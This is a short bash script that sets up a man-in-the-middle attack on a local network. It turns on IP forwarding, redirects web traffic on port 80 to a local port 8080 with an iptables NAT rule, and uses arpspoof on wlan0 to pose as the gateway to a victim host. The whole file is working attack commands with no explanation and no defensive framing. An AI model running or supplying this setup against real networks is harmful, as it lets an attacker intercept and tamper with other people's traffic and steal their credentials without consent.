#!/bin/bash

echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

arpspoof -i wlan0 -t 192.168.1.103 192.168.1.254

